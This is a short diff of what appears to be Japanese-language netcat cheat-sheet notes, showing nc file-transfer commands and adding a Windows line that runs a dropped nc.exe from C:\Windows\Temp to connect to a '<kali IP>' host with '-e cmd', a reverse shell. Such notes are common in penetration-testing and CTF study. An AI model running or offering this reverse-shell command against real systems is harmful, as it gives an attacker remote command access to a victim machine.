@@ -6,3 +6,5 @@ nc <IP> <port> #送信側
 nc -lvnp <port> < example.txt #ファイル送信側
 nc <IP> <port> > example.txt #ファイル受信側
 
+//windows
+cmd.exe /c C:\Windows\Temp\nc.exe <kali IP> <port> -e cmd #配送したncをcmdで実行してシェル
